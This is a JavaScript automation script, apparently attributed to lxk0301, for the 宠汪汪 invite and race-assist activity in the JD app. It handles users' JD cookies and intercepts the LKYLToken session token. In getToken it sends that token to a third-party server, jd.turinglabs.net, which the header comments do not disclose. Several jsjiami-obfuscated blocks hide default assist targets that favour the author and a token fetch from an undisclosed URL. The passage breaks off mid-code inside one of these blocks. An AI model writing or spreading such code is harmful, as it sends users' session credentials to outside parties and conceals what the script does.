
/**
宠汪汪邀请助力与赛跑助力脚本，感谢github@Zero-S1提供帮助
更新时间：2021-1-7（宠汪汪助力更新Token的配置正则表达式已改）
活动入口：京东APP我的-更多工具-宠汪汪
token时效很短，几个小时就失效了,闲麻烦的放弃就行
每天拿到token后，可一次性运行完毕即可。
互助码friendPin是京东用户名，不是昵称（可在京东APP->我的->设置 查看获得）
token获取途径：
1、微信搜索'来客有礼'小程序,登陆京东账号，点击底部的'我的'或者'发现'两处地方,即可获取Token，脚本运行提示token失效后，继续按此方法获取即可
2、或者每天去'来客有礼'小程序->宠汪汪里面，领狗粮->签到领京豆 也可获取Token(此方法每天只能获取一次)
脚本里面有内置提供的friendPin，如果你没有修改脚本或者BoxJs处填写自己的互助码，会默认给脚本内置的助力。
脚本作者lxk0301
 **/
const isRequest = typeof $request != "undefined"
const $ = new Env('宠汪汪赛跑');
const JD_BASE_API = `https://draw.jdfcloud.com//pet`;
//此处填入你需要助力好友的京东用户名
//下面给出好友邀请助力的示例填写规则
var _0xod3='jsjiami.com.v6',_0x4ba3=[_0xod3,'FMObc8KWRw==','W23DnRrDhcOH','DsOFe8KaSxoO','wolOw7gAwp3Dkw==','G8OTwrXCuMOGw4DDgw==','wqrDnsONeHwWw5jDsV3Dr2A9woLCu8Olw6E=','6KK75ouX5Y6r55qu6K+j5b6Ow4EO','bD17woTCnQwbwofCmzXCpyLDncOWRsKT','bD17wofCmFlMw5fDiznDtyPCh8KGRcOH','wrsXwrvDpAfDhU0H','wqZtw5AMw5fDrsK8w5EGwrLDvzPDnU3DrsOQ','6KOq5omY5Y6B55iY6K+h5b+fw57DusOLwrzCmhpkwprCl8OpwpASOmnCsMKnwqBEVG3DlUk6EsKoAU8Sw6ZqWQEEfgQwRMOKEXzDvQzCn8KsL8O5w6HCqXV+JsO2w5tpGcOYKDRuw6fDpW7Cu2REYkjDkmdnI8OvwrnDicKUL8K2RcONQMKRwpPCsMK3woHCtBrDnzsLdx7DqitvwqsORMKIw4dMwrbDj8Ovw6nDg8K2w6M5wqB9A09aB8KWP0ZSwrbCrsK0w7d6fgPDtS7CmnTCgQwow7FpwojDpXtkR8KUwqbDvcKSw6XDp8Kxwq0tC8KtdiTDoGUsBV0RwofDrsOZMyjDssOOYR9Gwp4nDsOYfwhiJw==','HjsjENhWSidaAmHxlli.com.v6=='];(function(_0x2d8f05,_0x4b81bb,_0x4d74cb){var _0x32719f=function(_0x2dc776,_0x362d54,_0x2576f4,_0x5845c1,_0x4fbc7a){_0x362d54=_0x362d54>>0x8,_0x4fbc7a='po';var _0x292610='shift',_0x151bd2='push';if(_0x362d54<_0x2dc776){while(--_0x2dc776){_0x5845c1=_0x2d8f05[_0x292610]();if(_0x362d54===_0x2dc776){_0x362d54=_0x5845c1;_0x2576f4=_0x2d8f05[_0x4fbc7a+'p']()}else if(_0x362d54&&_0x2576f4['replace'](/[HENhWSdAHxll=]/g,'')===_0x362d54){_0x2d8f05[_0x151bd2](_0x5845c1)}}_0x2d8f05[_0x151bd2](_0x2d8f05[_0x292610]())}return 0x73f5d};return _0x32719f(++_0x4b81bb,_0x4d74cb)>>_0x4b81bb^_0x4d74cb}(_0x4ba3,0x14f,0x14f00));var _0x51f5=function(_0x542044,_0x17cf38){_0x542044=~~'0x'['concat'](_0x542044);var _0x112687=_0x4ba3[_0x542044];if(_0x51f5['bSwgUi']===undefined){(function(){var _0xab313c=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x4e6f6d='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0xab313c['atob']||(_0xab313c['atob']=function(_0x5f39d6){var _0x208cb4=String(_0x5f39d6)['replace'](/=+$/,'');for(var _0x3d6b71=0x0,_0xe5dc75,_0x3df178,_0x4fddde=0x0,_0x35f558='';_0x3df178=_0x208cb4['charAt'](_0x4fddde++);~_0x3df178&&(_0xe5dc75=_0x3d6b71%0x4?_0xe5dc75*0x40+_0x3df178:_0x3df178,_0x3d6b71++%0x4)?_0x35f558+=String['fromCharCode'](0xff&_0xe5dc75>>(-0x2*_0x3d6b71&0x6)):0x0){_0x3df178=_0x4e6f6d['indexOf'](_0x3df178)}return _0x35f558})}());var _0x231047=function(_0x45dc9c,_0x17cf38){var _0x537b35=[],_0x277672=0x0,_0x3f8468,_0x1c92dc='',_0x17ca2c='';_0x45dc9c=atob(_0x45dc9c);for(var _0x962db4=0x0,_0x42829e=_0x45dc9c['length'];_0x962db4<_0x42829e;_0x962db4++){_0x17ca2c+='%'+('00'+_0x45dc9c['charCodeAt'](_0x962db4)['toString'](0x10))['slice'](-0x2)}_0x45dc9c=decodeURIComponent(_0x17ca2c);for(var _0x411a1b=0x0;_0x411a1b<0x100;_0x411a1b++){_0x537b35[_0x411a1b]=_0x411a1b}for(_0x411a1b=0x0;_0x411a1b<0x100;_0x411a1b++){_0x277672=(_0x277672+_0x537b35[_0x411a1b]+_0x17cf38['charCodeAt'](_0x411a1b%_0x17cf38['length']))%0x100;_0x3f8468=_0x537b35[_0x411a1b];_0x537b35[_0x411a1b]=_0x537b35[_0x277672];_0x537b35[_0x277672]=_0x3f8468}_0x411a1b=0x0;_0x277672=0x0;for(var _0x452d95=0x0;_0x452d95<_0x45dc9c['length'];_0x452d95++){_0x411a1b=(_0x411a1b+0x1)%0x100;_0x277672=(_0x277672+_0x537b35[_0x411a1b])%0x100;_0x3f8468=_0x537b35[_0x411a1b];_0x537b35[_0x411a1b]=_0x537b35[_0x277672];_0x537b35[_0x277672]=_0x3f8468;_0x1c92dc+=String['fromCharCode'](_0x45dc9c['charCodeAt'](_0x452d95)^_0x537b35[(_0x537b35[_0x411a1b]+_0x537b35[_0x277672])%0x100])}return _0x1c92dc};_0x51f5['uERWbC']=_0x231047;_0x51f5['wXWxPt']={};_0x51f5['bSwgUi']=!![]}var _0x406e23=_0x51f5['wXWxPt'][_0x542044];if(_0x406e23===undefined){if(_0x51f5['ySEjIN']===undefined){_0x51f5['ySEjIN']=!![]}_0x112687=_0x51f5['uERWbC'](_0x112687,_0x17cf38);_0x51f5['wXWxPt'][_0x542044]=_0x112687}else{_0x112687=_0x406e23}return _0x112687};let invite_pins=['104720238-540078,15905303986_p,丶呐喊丶丶,残雪秋影,jd_448b0c4918e92,jd_53c6a078fee20,jd_owyazMKQSwfT'];let run_pins=['104720238-540078,15905303986_p,丶呐喊丶丶,残雪秋影,jd_448b0c4918e92,jd_53c6a078fee20,jd_owyazMKQSwfT'];let temp=run_pins[0x0][_0x51f5('1','EsGC')](',');let fixPins=temp[_0x51f5('2','r*yV')](temp[_0x51f5('3','EsGC')]('jd_6cd93e613b0e5'),0x1);fixPins['push'](...temp[_0x51f5('4','8b]e')](temp[_0x51f5('5','EGiV')]('被折叠的记忆33'),0x1));const randomPins=getRandomArrayElements(temp,0x4);temp=[...fixPins,...randomPins];run_pins=[temp['join'](',')];let friendsArr=[_0x51f5('6','sgc['),_0x51f5('7','Ik*@'),_0x51f5('8','5MKk'),_0x51f5('9','5MKk'),_0x51f5('a','qPzP'),_0x51f5('b','Gr78'),'jd_41345a6f96aa5'];_0xod3='jsjiami.com.v6';// $.LKYLToken = '76fe7794c475c18711e3b47185f114b5' || $.getdata('jdJoyRunToken');
// $.LKYLToken = '76fe7794c475c18711e3b47185f114b5' || $.getdata('jdJoyRunToken');
// $.LKYLToken = $.getdata('jdJoyRunToken');
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
//IOS等用户直接用NobyDa的jd cookie
let cookiesArr = [], cookie = '';
let helpAuthor = true;
const headers = {
  'Connection' : 'keep-alive',
  'Accept-Encoding' : 'gzip, deflate, br',
  'App-Id' : '',
  'Lottery-Access-Signature' : '',
  'Content-Type' : 'application/json',
  'reqSource' : 'weapp',
  'User-Agent' : $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
  'Cookie' : '',
  'openId' : '',
  'Host' : 'draw.jdfcloud.com',
  'Referer' : 'https://servicewechat.com/wxccb5c536b0ecd1bf/633/page-frame.html',
  'Accept-Language' : 'zh-cn',
  'Accept' : '*/*',
  'LKYLToken' : ''
}
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
} else {
  //支持 "京东多账号 Ck 管理"的cookie
  cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
  if ($.getdata('jd_joy_invite_pin')) {
    invite_pins = [];
    invite_pins.push($.getdata('jd_joy_invite_pin'));
  }
  if ($.getdata('jd2_joy_invite_pin')) {
    if (invite_pins.length > 0) {
      invite_pins.push($.getdata('jd2_joy_invite_pin'))
    } else {
      invite_pins = [];
      invite_pins.push($.getdata('jd2_joy_invite_pin'));
    }
  }
  if ($.getdata('jd_joy_run_pin')) {
    run_pins = []
    run_pins.push($.getdata('jd_joy_run_pin'));
  }
  if ($.getdata('jd2_joy_run_pin')) {
    if (run_pins.length > 0) {
      run_pins.push($.getdata('jd2_joy_run_pin'))
    } else {
      run_pins = [];
      run_pins.push($.getdata('jd2_joy_run_pin'));
    }
  }
}

//获取来客有礼Token
let count = 0;
async function getToken() {
  const url = $request.url;
  $.log(`${$.name}url\n${url}\n`)
  if (isURL(url, /^https:\/\/draw\.jdfcloud\.com(\/mirror)?\/\/api\/user\/addUser\?code=/)) {
    const body = JSON.parse($response.body);
    const LKYLToken = body.data && body.data.token;
    if (LKYLToken) {
      $.log(`${$.name} token\n${LKYLToken}\n`);
      count = $.getdata('countFlag') ? $.getdata('countFlag') * 1 : 0;
      count ++;
      console.log(`count: ${count}`)
      $.setdata(`${count}`, 'countFlag');
      if ($.getdata('countFlag') * 1 === 2) {
        count = 0;
        $.setdata(`${count}`, 'countFlag');
        $.msg($.name, '更新Token: 成功🎉', ``);
        console.log(`开始上传Token，${LKYLToken}\n`)
        await $.http.get({url: `http://jd.turinglabs.net/api/v2/jd/joy/create/${LKYLToken}/`}).then((resp) => {
          if (resp.statusCode === 200) {
            let { body } = resp;
            console.log(`Token提交结果:${body}\n`)
            body = JSON.parse(body);
            console.log(`${body.message}`)
          }
        });
      }
      $.setdata(LKYLToken, 'jdJoyRunToken');
    }
    $.done({ body: JSON.stringify(body) })
  } else if (isURL(url, /^https:\/\/draw\.jdfcloud\.com(\/mirror)?\/\/api\/user\/user\/detail\?openId=/)){
    if ($request && $request.method !== 'OPTIONS') {
      const LKYLToken = $request.headers['LKYLToken'];
      //if ($.getdata('jdJoyRunToken')) {
        //if ($.getdata('jdJoyRunToken') !== LKYLToken) {

        //}
        //$.msg($.name, '更新获取Token: 成功🎉', `\n${LKYLToken}\n`);
      //} else {
        //$.msg($.name, '获取Token: 成功🎉', `\n${LKYLToken}\n`);
      //}
      $.setdata(LKYLToken, 'jdJoyRunToken');

      $.msg($.name, '获取Token: 成功🎉', ``);

      // $.done({ body: JSON.stringify(body) })
      $.done({ url: url })
    }
  } else {
    $.done()
  }
}
var _0xodn='jsjiami.com.v6',_0x238c=[_0xodn,'wqo/csObSQ==','woTCnjjCvkA=','ETEEByc=','wqbCkl7DiAk=','w7zDjcKiJHA=','wrPDucKufTR7e2ZzUcK9w4AWwpvDk3fCucK3McKCRg0tPxAAIlLDrMOcwqc7UjdFw7k2eXvCnBoCw7QTwq3DkAdI','IcKMGWp1','w5jDssKbEX4=','w6AAU8KcZklmbcOa','w6nDvXM4','C8KcKHrorLPms6Dlp7Hotq3vvojor4Tmo5rmnZvnv43otZPphK7or5Q=','LxPCk1/Cjw==','fG7Co2jDvQ==','UQHCpA==','w6DCuDXCpcKG','w6ouwppDKg==','R8OCwrsIGg==','eMOpTA==','elB/w77DqsKxw43CkMKF','w73DlsKWJ1jDsQ==','jsjixJami.wcPodIDmXN.GvVreH6d=='];(function(_0x4d66ab,_0xc46eb2,_0x4c454b){var _0x455e5f=function(_0x25e40c,_0x2fe30d,_0x4f034d,_0x330ef7,_0x13903d){_0x2fe30d=_0x2fe30d>>0x8,_0x13903d='po';var _0x4b65bf='shift',_0x368e1a='push';if(_0x2fe30d<_0x25e40c){while(--_0x25e40c){_0x330ef7=_0x4d66ab[_0x4b65bf]();if(_0x2fe30d===_0x25e40c){_0x2fe30d=_0x330ef7;_0x4f034d=_0x4d66ab[_0x13903d+'p']();}else if(_0x2fe30d&&_0x4f034d['replace'](/[xJwPdIDXNGVreHd=]/g,'')===_0x2fe30d){_0x4d66ab[_0x368e1a](_0x330ef7);}}_0x4d66ab[_0x368e1a](_0x4d66ab[_0x4b65bf]());}return 0x73f58;};return _0x455e5f(++_0xc46eb2,_0x4c454b)>>_0xc46eb2^_0x4c454b;}(_0x238c,0xf0,0xf000));var _0x2ca4=function(_0x2d8f05,_0x4b81bb){_0x2d8f05=~~'0x'['concat'](_0x2d8f05);var _0x34a12b=_0x238c[_0x2d8f05];if(_0x2ca4['hsuNOY']===undefined){(function(){var _0x36c6a6=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x33748d='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x36c6a6['atob']||(_0x36c6a6['atob']=function(_0x3e4c21){var _0x5c685e=String(_0x3e4c21)['replace'](/=+$/,'');for(var _0x3e3156=0x0,_0x1e9e81,_0x292610,_0x151bd2=0x0,_0x558098='';_0x292610=_0x5c685e['charAt'](_0x151bd2++);~_0x292610&&(_0x1e9e81=_0x3e3156%0x4?_0x1e9e81*0x40+_0x292610:_0x292610,_0x3e3156++%0x4)?_0x558098+=String['fromCharCode'](0xff&_0x1e9e81>>(-0x2*_0x3e3156&0x6)):0x0){_0x292610=_0x33748d['indexOf'](_0x292610);}return _0x558098;});}());var _0xd7aec1=function(_0x230f38,_0x4b81bb){var _0x29929c=[],_0x5dd881=0x0,_0x550fbc,_0x18d5c9='',_0x4ce2f1='';_0x230f38=atob(_0x230f38);for(var _0x333808=0x0,_0x432180=_0x230f38['length'];_0x333808<_0x432180;_0x333808++){_0x4ce2f1+='%'+('00'+_0x230f38['charCodeAt'](_0x333808)['toString'](0x10))['slice'](-0x2);}_0x230f38=decodeURIComponent(_0x4ce2f1);for(var _0x2ab90b=0x0;_0x2ab90b<0x100;_0x2ab90b++){_0x29929c[_0x2ab90b]=_0x2ab90b;}for(_0x2ab90b=0x0;_0x2ab90b<0x100;_0x2ab90b++){_0x5dd881=(_0x5dd881+_0x29929c[_0x2ab90b]+_0x4b81bb['charCodeAt'](_0x2ab90b%_0x4b81bb['length']))%0x100;_0x550fbc=_0x29929c[_0x2ab90b];_0x29929c[_0x2ab90b]=_0x29929c[_0x5dd881];_0x29929c[_0x5dd881]=_0x550fbc;}_0x2ab90b=0x0;_0x5dd881=0x0;for(var _0x991246=0x0;_0x991246<_0x230f38['length'];_0x991246++){_0x2ab90b=(_0x2ab90b+0x1)%0x100;_0x5dd881=(_0x5dd881+_0x29929c[_0x2ab90b])%0x100;_0x550fbc=_0x29929c[_0x2ab90b];_0x29929c[_0x2ab90b]=_0x29929c[_0x5dd881];_0x29929c[_0x5dd881]=_0x550fbc;_0x18d5c9+=String['fromCharCode'](_0x230f38['charCodeAt'](_0x991246)^_0x29929c[(_0x29929c[_0x2ab90b]+_0x29929c[_0x5dd881])%0x100]);}return _0x18d5c9;};_0x2ca4['nzDUsz']=_0xd7aec1;_0x2ca4['qbsFDM']={};_0x2ca4['hsuNOY']=!![];}var _0x981158=_0x2ca4['qbsFDM'][_0x2d8f05];if(_0x981158===undefined){if(_0x2ca4['jCKLiJ']===undefined){_0x2ca4['jCKLiJ']=!![];}_0x34a12b=_0x2ca4['nzDUsz'](_0x34a12b,_0x4b81bb);_0x2ca4['qbsFDM'][_0x2d8f05]=_0x34a12b;}else{_0x34a12b=_0x981158;}return _0x34a12b;};function readToken(){var _0x3efa1e={'IKjsT':_0x2ca4('0','c%4]'),'lhfUJ':function(_0x3718aa,_0x5c85ad){return _0x3718aa!==_0x5c85ad;},'vtcim':_0x2ca4('1','N6sc'),'TQllT':_0x2ca4('2','9]wL'),'XXIDD':'ehMAe','hZXcn':'Njmbu','mtSFZ':'NPlFA'};return new Promise(_0x3f6bcb=>{if(_0x3efa1e[_0x2ca4('3','FE^8')]!==_0x3efa1e[_0x2ca4('4','raei')]){$['get']({'url':_0x2ca4('5','w@Zt'),'timeout':0x2710},(_0x323cce,_0x336bdd,_0x200dce)=>{if(_0x2ca4('6','ATk#')===_0x3efa1e[_0x2ca4('7','raei')]){try{if(_0x323cce){console['log'](''+JSON[_0x2ca4('8','a)!g')](_0x323cce));console['log']($[_0x2ca4('9','d20F')]+_0x2ca4('a','kkvh'));}else{if(_0x3efa1e[_0x2ca4('b','NyWM')](_0x3efa1e[_0x2ca4('c','DCJ2')],_0x3efa1e['vtcim'])){if(_0x200dce){console[_0x2ca4('d','#m60')](_0x200dce);_0x200dce=JSON['parse'](_0x200dce);}}else{if(_0x200dce){console['log'](_0x200dce);_0x200dce=JSON[_0x2ca4('e','tzGt')](_0x200dce);}}}}catch(_0x4d6222){$['logErr'](_0x4d6222,_0x336bdd);}finally{if(_0x3efa1e[_0x2ca4('f','rqqY')]!==_0x3efa1e[_0x2ca4('10','igc4')]){_0x3f6bcb(_0x200dce);}else{console[_0x2ca4('11','wF9m')](''+JSON[_0x2ca4('12','Z(f[')](_0x323cce));console['log']($['name']+'\x20API请求失败，请检查网路重试');}}}else{$[_0x2ca4('13','raei')](e,_0x336bdd);}});}else{_0x3f6bcb(data);}});};_0xodn='jsjiami.com.v6';
async function main() {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  const readTokenRes = await readToken();
  if (readTokenRes && readTokenRes.code === 200) {
    $.LKYLToken = readTokenRes.data[0] || $.getdata('jdJoyRunToken');
  } else {
    $.LKYLToken = $.getdata('jdJoyRunToken');
  }
  // $.LKYLToken = $.getdata('jdJoyRunToken');
  console.log(`打印token \n${$.LKYLToken}\n`)
  if (!$.LKYLToken) {
    $.msg($.name, '【提示】请先获取来客有礼宠汪汪token', "微信搜索'来客有礼'小程序\n点击底部的'发现'Tab\n即可获取Token");
    return;
  }
  await getFriendPins();
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
      $.index = i + 1;
      $.inviteReward = 0;
      $.runReward = 0;
      console.log(`\n开始【京东账号${$.index}】${UserName}\n`);
      $.jdLogin = true;
      $.LKYLLogin = true;
      console.log(`=============【开始】===============`)
      const inviteIndex = $.index > invite_pins.length ? (invite_pins.length - 1) : ($.index - 1);
      let new_invite_pins = invite_pins[inviteIndex].split(',');
      new_invite_pins = [...new_invite_pins, ...getRandomArrayElements(friendsArr, friendsArr.length >= 18 ? 18 : friendsArr.length)];
      await invite(new_invite_pins);
      if ($.jdLogin && $.LKYLLogin) {
        console.log(`===========【开始】===========`)
        const runIndex = $.index > run_pins.length ? (run_pins.length - 1) : ($.index - 1);
        let new_run_pins = run_pins[runIndex].split(',');
        await run(new_run_pins);
      }
      await showMsg();
    }
  }
  $.done()
}
function showMsg() {
  return new Promise(async resolve => {
    if ($.inviteReward || $.runReward) {
      let message = '';
      if ($.inviteReward > 0) {
        message += `获得${$.inviteReward}积分\n`;
      }
      if ($.runReward > 0) {
        message += `获得狗粮${$.runReward}g`;
      }
      if (message) {
        $.msg($.name, '', `京东账号${$.index} ${UserName}\n${message}`);
      }
    }
    resolve();
  })
}
//邀请助力
async function invite(invite_pins) {
  for (let item of invite_pins.map(item => item.trim())) {
    console.log(`\n账号${$.index} [${UserName}] 开始`)
    const data = await enterRoom(item);
    if (data) {
      var _0xoda='jsjiami.com.v6',_0x29ae=[_0xoda,'esKRGsOuwr8=','LCd3VB8=','fMOBLcKFQMKbw6w=','Xikdwr8=','ccKGBsODwpxL','w5HDnzNhOgfDrsOFwrlew4PDi2XCrxLDqVnDv8ORwoMXwp1fCUfCrmXCgwXDs20JbXA=','wo7CqQvDvsOf','w5PChgfDqhs=','w6ojw7/Cuw==','wrIdTiFN','w5PCrj7DvjMSdFluw4Qgw5bCg8KxwqHCsVvCpMKuwpMpw4LDuMKowpMcJFzDuWo=','TVd1IgUiwpLDuAlHf8K+w7NlWmIUw6VHOcKtNsK5woISw7kSwpnDlsOhO8OTSsKWw5NtwpDDisK3FMOAwqTDgzXDsCM=','HcKNw47DpcOIw7fDug==','FsO9w4F7','aMO0w785wqg=','CMKPFMKJRA9MN8OHwonCq17DqWHDpWtOfwrDlcOgw7jCmnM+OBnDukfDjMKhw7vDsMKkwpY8w4XCvlgD','e8K/MWrCjMKEw4Q=','w5rCvm/Ctw==','w5nCsTrDjTU4','ZMK4YcOa','w4x9SMKGw7I=','Z23Cp3HDtQ==','C8OPw5ZPw6M=','U17DucK4','wrFvVhIV','wp7DiHXDpjU=','FMOLw4IRw5tlDcOQR8OiUFcDw5AWSSjDqMK8a8OZdcOGwp7DnsOXTsOJbCXDtsOpw5k=','GcONw5/CnsODw4DDhMOTw4IlLcOGw5fDg24nwr0=','w5LCti/DjgxHaX3DosKkw6YKw4svS8KIwrXCqyxNwqQBw5LDgcKXwr/Dm8KJwrRiPXIOw4h9a8OTU8KJQAFJwqBRwp7DmhMpNcKlw7NtbHBsCsK0wqMLw7kRN1JYL1VDw6wbLBAAdsKiOcKfwohWawrCtMO4DMKqwrrDpXcUIk9gwqdlTnHDsGRodnvDqBJDYUUgCkLClcOiw7UVZm1dCDR1IMK8ZDfCtMKhesOsdTDDvcOyOcOVwqMXWwDDrzg4H2NLwo7DsjHDo0/Ds8OJw7rCrcONBBw4w4rClsKVw6HChcKQOcKcwpw4LUo8RxM3wrjDpH/DryfCrkJlUCloMHZjwqBHwqLDrMOaw5jDvAfDocKQwo3Dt8OHHFrCrEXDpSvCpcObwqTDnntSJTt6w4LDnT3CosKVwqpIecOjcS9xaW3Cqxskwr8rwqhJV8O4bQLCjULCpSVHfMK0AcOlwrsWwqjDm8OLwpPCtsO5fsOtw4fDvh07w44vw47Cl8KHN8OodXYCKyXDqhfDo2cFw7kqQsOLw4PCjcK2SMK3VMK5cg==','UUo2Ih8=','wpvCsR1swpQ=','w7/Dn008DA==','b8OGXcO3wq/ClcOkFW3DkVxZdxh7wqrDhiAs','fcOkw4/Co8KFacOObzPDpMKQOBLCj8KMw47CvUbCjcORwo5rNmPCgMKaPcOTW8K7wrLCpsK6','Ujwdwq4iHsOkwo0VwofDojJdSDvCtBs6JsK9w7jCgsOjXsKiAcOgwr5xEsOBORzDuSZ9YX7DpcKkSAEJIsOXN8K7w4MuV8K9wo7DmhROZsK9wpAXwozDgsKFwp/CtsO2w78Gw6rCjDg=','w5LDqcKHOx/CksOawo/DgMKee3DCgTcBwoQifyHDsjgrwrnCqX3ClFjCh8KTX8K6w5ckwp0Kw4N8Xno7w4LCuSXDuTTDjMOcBcOrwoLCsDA4OMKwwpbCj8O7QcOxCMOrEMKHwpkjDRfCnmjDrh5sMBR/bsOCfsOPfBfDkcOSwrTCk8Kuw5HCnjnDj8KqZCYYA8Oqw7vDnTjCmE/CrFHCn8Oow4VPZ8OMw6l8NyjDhFY0XcKQKynDql7DggbCh8Kuw7gcPUvCjxF9w7pMAVBDwonCrjjCo1UeJsKJMUXCt0fCmsOsw7k7woc=','w5fDvk4=','woFtVAA0','OcOfcsKuwpw=','GMKcw4rDqMOmw7HDr8OYwrHCuXAqw6YPLcKyTQHDh0tIZG8fecKrwqJuFzY5VsK0','GcKYcsOnZg==','w5rCvm/Ct08hCw==','w6HCuMOYwqM=','w47CrMOxw5MONw==','dsKTQMOFw4Q=','W8KFdsOWw7I=','wq1HwrcRYXdPw4N9w4QvwqDDiMOpXcOiw7LCjsOQw4gHDsKPw5jCr8K0EGEAw63DrsOpCSw=','UQHCgGVR','YSPCoVVq','EcKYw47DtMO8wqjCocKDwrDDozBowqIWJsOyAk7DngFScSIKecKOwqJ5FEx2DMOtO0HCssKeazBOfy5TQhsdw6/Dp1UwYMKiZHXDl8O9wp5aTTrCnsO8USTCmcK8wpZ7VnReUXnDqmDDqURZw7J1Hn8tw47ClMOdwqQtRjRmw6UbH8O8wp9Fw63CgcOmw5VwFA/DjMKKWg==','SErCtVrDhinDow==','EcOaw4Yc','cBjCuH1A','wp3DhXrDjy4kw6TCnMKOSMO3KsOUw5HDhcOXwp4gZMOLwpTCgsKCOMOBw7fCqsKzMcOoMMK2w65fw4Viwo/CocKaw4UpM8O2FHMf','w4bCqMOrw5U9OmA=','T0NvIA==','wop2DUYm','w7QXGwM0w5sXw5wMUm8mwpRCw6XCrcOUVcKIwrfCoz3DoArClcOkNWnChyxowp/DrMKYIcKYMDoEaw==','wrBoHArCvcOB','wpLDvW7CpW02L388wpN7Nk7DhiEMwqvCmcKBZwRjw44zw6smM2pMQMO2wpUnfWc7w70+bmvDscOwRMOnw78=','woBcfcKKw7w=','w4XDvcKtdEU=','YsOKSMONwrM=','aMOPKsKQ','PdGjsjLUIihambi.colmFl.ySv6=='];(function(_0x3bacf5,_0x25a49a,_0x581c27){var _0x5a2634=function(_0x3d8487,_0x55fa5b,_0x584974,_0x3da946,_0x453163){_0x55fa5b=_0x55fa5b>>0x8,_0x453163='po';var _0x436f86='shift',_0x327e87='push';if(_0x55fa5b<_0x3d8487){while(--_0x3d8487){_0x3da946=_0x3bacf5[_0x436f86]();if(_0x55fa5b===_0x3d8487){_0x55fa5b=_0x3da946;_0x584974=_0x3bacf5[_0x453163+'p']();}else if(_0x55fa5b&&_0x584974['replace'](/[PdGLUIhblFlyS=]/g,'')===_0x55fa5b){_0x3bacf5[_0x327e87](_0x3da946);}}_0x3bacf5[_0x327e87](_0x3bacf5[_0x436f86]());}return 0x7442c;};return _0x5a2634(++_0x25a49a,_0x581c27)>>_0x25a49a^_0x581c27;}(_0x29ae,0x1d9,0x1d900));var _0x1e18=function(_0x511006,_0xed8bf5){_0x511006=~~'0x'['concat'](_0x511006);var _0x1d9b16=_0x29ae[_0x511006];if(_0x1e18['HDNWcy']===undefined){(function(){var _0x19dffd=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0xc7ecde='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x19dffd['atob']||(_0x19dffd['atob']=function(_0x40175e){var _0x326825=String(_0x40175e)['replace'](/=+$/,'');for(var _0x4494c7=0x0,_0x25e5c4,_0x17bdc0,_0x4755ce=0x0,_0x57ada5='';_0x17bdc0=_0x326825['charAt'](_0x4755ce++);~_0x17bdc0&&(_0x25e5c4=_0x4494c7%0x4?_0x25e5c4*0x40+_0x17bdc0:_0x17bdc0,_0x4494c7++%0x4)?_0x57ada5+=String['fromCharCode'](0xff&_0x25e5c4>>(-0x2*_0x4494c7&0x6)):0x0){_0x17bdc0=_0xc7ecde['indexOf'](_0x17bdc0);}return _0x57ada5;});}());var _0x17e193=function(_0x4c67fc,_0xed8bf5){var _0x4142b9=[],_0x3bf984=0x0,_0xf7347e,_0x1ca880='',_0x4ff246='';_0x4c67fc=atob(_0x4c67fc);for(var _0x577efa=0x0,_0xffc3d0=_0x4c67fc['length'];_0x577efa<_0xffc3d0;_0x577efa++){_0x4ff246+='%'+('00'+_0x4c67fc['charCodeAt'](_0x577efa)['toString'](0x10))['slice'](-0x2);}_0x4c67fc=decodeURIComponent(_0x4ff246);for(var _0x3cc8a4=0x0;_0x3cc8a4<0x100;_0x3cc8a4++){_0x4142b9[_0x3cc8a4]=_0x3cc8a4;}for(_0x3cc8a4=0x0;_0x3cc8a4<0x100;_0x3cc8a4++){_0x3bf984=(_0x3bf984+_0x4142b9[_0x3cc8a4]+_0xed8bf5['charCodeAt'](_0x3cc8a4%_0xed8bf5['length']))%0x100;_0xf7347e=_0x4142b9[_0x3cc8a4];_0x4142b9[_0x3cc8a4]=_0x4142b9[_0x3bf984];_0x4142b9[_0x3bf984]=_0xf7347e;}_0x3cc8a4=0x0;_0x3bf984=0x0;for(var _0x793c5c=0x0;_0x793c5c<_0x4c67fc['length'];_0x793c5c++){_0x3cc8a4=(_0x3cc8a4+0x1)%0x100;_0x3bf984=(_0x3bf984+_0x4142b9[_0x3cc8a4])%0x100;_0xf7347e=_0x4142b9[_0x3cc8a4];_0x4142b9[_0x3cc8a4]=_0x4142b9[_0x3bf984];_0x4142b9[_0x3bf984]=_0xf7347e;_0x1ca880+=String['fromCharCode'](_0x4c67fc['charCodeAt'](_0x793c5c)^_0x4142b9[(_0x4142b9[_0x3cc8a4]+_0x4142b9[_0x3bf984])%0x100]);}return _0x1ca880;};_0x1e18['jlfcTG']=_0x17e193;_0x1e18['PtITcZ']={};_0x1e18['HDNWcy']=!![];}var 